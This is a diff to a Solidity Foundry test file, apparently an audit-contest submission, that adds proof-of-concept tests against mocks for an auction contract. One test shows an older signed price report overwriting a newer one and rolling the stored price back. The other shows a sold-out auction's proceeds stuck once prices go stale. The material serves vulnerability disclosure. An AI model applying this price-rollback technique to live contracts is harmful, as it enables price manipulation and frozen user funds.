@@ -475,27 +475,69 @@ contract C4PoC is Test {
   ///        forge test --match-test testSubmissionValidity -vvv
   ///
   function testSubmissionValidity() public {
-    // ╔═══════════════════════════════════════════════════════════════════╗
-    // ║                                                                 ║
-    // ║   WARDENS: Write your Proof-of-Concept code below this line.    ║
-    // ║                                                                 ║
-    // ║   Demonstrate the vulnerability by showing the impact.          ║
-    // ║   Use assert/revert checks to prove your finding.               ║
-    // ║                                                                 ║
-    // ╚═══════════════════════════════════════════════════════════════════╝
+    testDataStreamRollBack();
+    testSoldOutAuctionRemainsLiveWhenPriceTurnsStale();
+  }
 
-    // Example: Start a USDC auction and bid on it
-    //
-    // _startAuction(address(mockUSDC), 100_000e6);         // Start $100k USDC auction
-    // skip(auction.getAssetParams(address(mockUSDC)).auctionDuration / 2); // Wait half the auction
-    // _refreshPrices();                                     // Re-transmit prices (staleness = 1h, auction = 1d)
-    // _fundBidder(10_000e18);                               // Fund bidder with enough LINK
-    // _bid(address(mockUSDC), 100_000e6);                   // Bid on full amount
-    //
-    // NOTE: After any `skip()` exceeding 1 hour you MUST call `_refreshPrices()`
-    //       (or `_transmitPrices(...)`) before bidding, otherwise the price feeds
-    //       are stale and the bid will revert with `Errors.StaleFeedData()`.
-    //       The `_startAuctionAndSkip()` helper does this automatically.
+  function testDataStreamRollBack() public {
+    uint256 initialTimestamp = block.timestamp;
+    uint256 newerTimestamp = initialTimestamp + 30 minutes;
+    uint256 olderTimestamp = initialTimestamp + 10 minutes;
+
+    // First store a fresher report.
+    vm.warp(newerTimestamp);
+    _transmitPrices(4_500e18, 1e18, 20e18);
+
+    (uint256 latestPrice, uint256 latestUpdatedAt, bool latestIsValid) = auction.getAssetPrice(address(mockWETH));
+    assertEq(latestPrice, 4_500e18, "newer report should set the latest WETH price");
+    assertEq(latestUpdatedAt, newerTimestamp, "newer report should set the latest timestamp");
+    assertTrue(latestIsValid, "newer report should be valid");
+
+    // Then submit an older but still non-stale signed report. transmit() accepts it and rolls back state.
+    _transmitPricesWithObservationTimestamp(3_000e18, 1e18, 20e18, uint32(olderTimestamp));
+
+    (uint256 rolledBackPrice, uint256 rolledBackUpdatedAt, bool rolledBackIsValid) =
+      auction.getAssetPrice(address(mockWETH));
+
+    assertEq(rolledBackPrice, 3_000e18, "older report should overwrite the fresher stored price");
+    assertEq(rolledBackUpdatedAt, olderTimestamp, "timestamp should roll back to the older observation");
+    assertTrue(rolledBackIsValid, "rolled back report remains valid until staleness fallback triggers");
+    assertLt(rolledBackUpdatedAt, latestUpdatedAt, "PoC requires the stored timestamp to move backwards");
+  }
+
+  function testSoldOutAuctionRemainsLiveWhenPriceTurnsStale() public {
+    uint256 auctionAmount = 100_000e6;
+
+    _startAuction(address(mockUSDC), auctionAmount);
+
+    uint256 auctionStart = auction.getAuctionStart(address(mockUSDC));
+    uint256 requiredLinkAmount = _getAssetOutAmount(address(mockUSDC), auctionAmount);
+
+    assertNotEq(auctionStart, 0, "auction should be live after performUpkeep");
+    assertEq(mockUSDC.balanceOf(address(auction)), auctionAmount, "auction should custody the full sell inventory");
+
+    _fundBidder(requiredLinkAmount);
+    _bid(address(mockUSDC), auctionAmount);
+
+    assertEq(mockUSDC.balanceOf(address(auction)), 0, "bidder should fully clear the auction inventory");
+    assertEq(mockLINK.balanceOf(address(auction)), requiredLinkAmount, "auction should hold the collected assetOut");
+    assertEq(mockLINK.balanceOf(reserves), 0, "assetOut should not be forwarded before auction end");
+
+    skip(auction.getFeedInfo(address(mockUSDC)).stalenessThreshold + 1);
+
+    assertLt(
+      block.timestamp,
+      auctionStart + auction.getAssetParams(address(mockUSDC)).auctionDuration,
+      "PoC requires the auction to remain within its duration"
+    );
+
+    (bool upkeepNeeded, bytes memory performData) = auction.checkUpkeep("");
+
+    assertFalse(upkeepNeeded, "sold-out auction should be missed once the asset price turns stale");
+    assertEq(performData.length, 0, "checkUpkeep should not schedule the stale sold-out auction for closure");
+    assertEq(auction.getAuctionStart(address(mockUSDC)), auctionStart, "live auction flag remains pinned");
+    assertEq(mockLINK.balanceOf(address(auction)), requiredLinkAmount, "collected assetOut remains stuck in auction");
+    assertEq(mockLINK.balanceOf(reserves), 0, "reserves should still not receive the settled assetOut");
   }
 
   // ═══════════════════════════════════════════════════════════════════════════
@@ -512,6 +554,17 @@ contract C4PoC is Test {
     uint256 usdcPrice,
     uint256 linkPrice
   ) internal {
+    _transmitPricesWithObservationTimestamp(wethPrice, usdcPrice, linkPrice, uint32(block.timestamp));
+  }
+
+  /// @notice Transmit Data Streams prices with an explicit observationsTimestamp.
+  /// @dev Useful for PoCs that need to submit out-of-order but still non-stale reports.
+  function _transmitPricesWithObservationTimestamp(
+    uint256 wethPrice,
+    uint256 usdcPrice,
+    uint256 linkPrice,
+    uint32 observationsTimestamp
+  ) internal {
     (, address currentCaller,) = vm.readCallers();
 
     bytes[] memory unverifiedReports = new bytes[](3);
@@ -525,21 +578,21 @@ contract C4PoC is Test {
     PriceManager.ReportV3 memory wethReport;
     wethReport.dataStreamsFeedId = i_mockWETHFeedId;
     wethReport.price = int192(uint192(wethPrice));
-    wethReport.observationsTimestamp = uint32(block.timestamp);
+    wethReport.observationsTimestamp = observationsTimestamp;
     unverifiedReports[0] = abi.encode(context, abi.encode(wethReport), rs, ss, rawVs);
 
     // USDC report
     PriceManager.ReportV3 memory usdcReport;
     usdcReport.dataStreamsFeedId = i_mockUSDCFeedId;
     usdcReport.price = int192(uint192(usdcPrice));
-    usdcReport.observationsTimestamp = uint32(block.timestamp);
+    usdcReport.observationsTimestamp = observationsTimestamp;
     unverifiedReports[1] = abi.encode(context, abi.encode(usdcReport), rs, ss, rawVs);
 
     // LINK report
     PriceManager.ReportV3 memory linkReport;
     linkReport.dataStreamsFeedId = i_mockLINKFeedId;
     linkReport.price = int192(uint192(linkPrice));
-    linkReport.observationsTimestamp = uint32(block.timestamp);
+    linkReport.observationsTimestamp = observationsTimestamp;
     unverifiedReports[2] = abi.encode(context, abi.encode(linkReport), rs, ss, rawVs);
 
     _changePrank(priceAdmin);
